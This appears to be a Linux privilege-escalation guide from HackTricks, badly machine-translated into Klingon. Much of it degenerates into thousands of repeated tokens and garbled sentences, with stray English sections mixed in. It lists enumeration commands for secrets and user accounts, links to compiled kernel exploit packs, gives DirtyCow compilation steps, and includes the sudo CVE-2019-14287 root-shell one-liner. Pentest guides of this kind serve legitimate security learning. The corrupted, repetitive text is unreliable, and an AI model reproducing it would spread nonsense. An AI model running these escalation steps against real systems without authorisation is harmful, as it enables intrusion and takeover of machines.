# Linux Privilege Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## System Information

### OS info

Let's start gaining some knowledge of the OS running
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### nIq

**`PATH`** variableDa **yIqej permissions** DajatlhlaHbe'chugh **yIqej folder** vaj **yIqej libraries** vaj **binaries** Hijack Qapchu'be'.
```bash
echo $PATH
```
### QaD jImej

QaD jImej, nIvboghmey, API keys, pe'vIlmeyDaq vItlhutlh?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

**Qa'vIn QaD**

QaD QaD je 'ej qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qa
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
**QIbDI'** [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) **'ej** [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits) **vulnerable kernel list** **yIqaw** **'e'**.\
**compiled exploits** **yIqaw** **'e'** **'ej** **'oH** **websites** **yIqaw** **'e'** [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack) **yIqaw** **'e'**.

**vulnerable kernel versions** **web** **'e'** **extract** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yIqaw** **'e'** **'ej** **'oH** **yI
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools that could help to search for kernel exploits are:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Based on the vulnerable sudo versions that appear in:

### Sudo version

Based on the vulnerable sudo versions that appear in:
```bash
searchsploit sudo
```
**You can check if the sudo version is vulnerable using this grep.**

**tlhIngan Hol translation:**

**ghItlhvam sudo version lo'laHbe'chugh, 'ej vaj grep vItlhutlh.**
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

QaHbe' @sickrov

---

#### CVE-2019-14287

##### Description

In sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.

##### Exploitation

To exploit this vulnerability, an attacker needs to have access to a Runas ALL sudoer account. The attacker can then invoke sudo with a crafted user ID to bypass certain policy blacklists and session PAM modules.

##### Mitigation

Upgrade to sudo version 1.8.28 or later to fix this vulnerability.
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

**HTB** **smasher2** box-**Daqtagh** **vuln** **exploit** **example** **yInIS** **tlhIngan** **ghaH** **vItlhutlh**.
```bash
dmesg 2>/dev/null | grep "signature"
```
### yI'el cha'logh yIghoS

#### Introduction

In order to successfully escalate privileges on a Linux system, it is crucial to gather as much information as possible about the target system. System enumeration involves identifying the system's configuration, installed software, and user accounts, which can provide valuable insights for privilege escalation.

#### Gathering System Information

1. **Kernel Version**: Obtain the kernel version using the `uname -a` command. This information can be useful for identifying potential vulnerabilities or exploits specific to the kernel version.

2. **Distribution**: Determine the Linux distribution by checking the contents of the `/etc/*-release` files or using the `lsb_release -a` command. Different distributions may have different default configurations and package managers.

3. **Processes**: List running processes using the `ps aux` command. Look for processes running with elevated privileges or processes associated with specific users that may be targeted for privilege escalation.

4. **Services**: Identify running services using the `netstat -tuln` command. Pay attention to services running as root or with elevated privileges, as they may provide opportunities for privilege escalation.

5. **Installed Software**: List installed software and packages using package managers such as `dpkg`, `rpm`, or `yum`. Look for outdated or vulnerable software versions that can be exploited.

6. **User Accounts**: Obtain a list of user accounts using the `cat /etc/passwd` command. Identify user accounts with elevated privileges or weak passwords that can be targeted for privilege escalation.

7. **File Permissions**: Check file permissions using the `ls -la` command. Look for files or directories with write permissions that can be leveraged for privilege escalation.

8. **Scheduled Tasks**: Examine scheduled tasks using the `crontab -l` command. Look for tasks executed with elevated privileges or tasks associated with specific users that may be targeted for privilege escalation.

#### Conclusion

System enumeration is a critical step in the privilege escalation process. By gathering detailed information about the target system, you can identify potential vulnerabilities and weak points that can be exploited to escalate privileges.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### Enumerate possible defenses

### AppArmor

#### tlhIngan Hol translation:

### qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' qar'a'wI' 